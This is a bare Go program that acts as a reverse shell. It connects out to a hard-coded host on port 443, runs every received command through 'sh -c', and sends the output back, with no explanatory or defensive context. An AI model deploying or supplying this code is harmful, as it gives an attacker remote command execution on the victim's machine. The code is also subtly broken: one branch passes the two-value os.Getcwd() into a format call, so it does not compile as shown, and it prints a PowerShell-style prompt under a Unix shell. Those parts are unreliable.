// Unix/Linux/macOS
package main

import (
    "fmt"
    "net"
    "os"
    "os/exec"
    "strings"
)

func main() {
    host := "192.168.0.8"
    port := 443

    client, err := net.Dial("tcp", fmt.Sprintf("%s:%d", host, port))
    if err != nil {
        fmt.Printf("Connection error: %v", err)
        return
    }
    defer client.Close()

    for {
        data := make([]byte, 65536)
        n, err := client.Read(data)
        if err != nil || n == 0 {
            break
        }

        command := strings.TrimSpace(string(data[:n]))

        result, err := exec.Command("sh", "-c", command).CombinedOutput()
        if err != nil {
            sendback := fmt.Sprintf("Error: %v\nPS %s> ", err, os.Getcwd())
            client.Write([]byte(sendback))
        } else {
            currentDir, _ := os.Getwd()
            sendback := fmt.Sprintf("%s\nPS %s> ", result, currentDir)
            client.Write([]byte(sendback))
        }
    }
}
